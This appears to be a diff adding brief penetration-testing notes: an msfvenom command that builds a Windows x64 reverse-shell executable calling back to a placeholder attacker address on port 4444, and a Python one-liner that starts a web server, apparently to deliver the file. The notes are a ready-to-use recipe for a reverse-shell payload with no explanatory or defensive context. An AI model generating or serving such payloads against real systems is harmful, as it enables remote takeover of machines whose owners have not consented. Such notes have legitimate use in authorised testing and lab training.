@@ -1,0 +1,5 @@
+MSF Venom :
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
+
+Python Server :
+    python3 -m http.server 8000
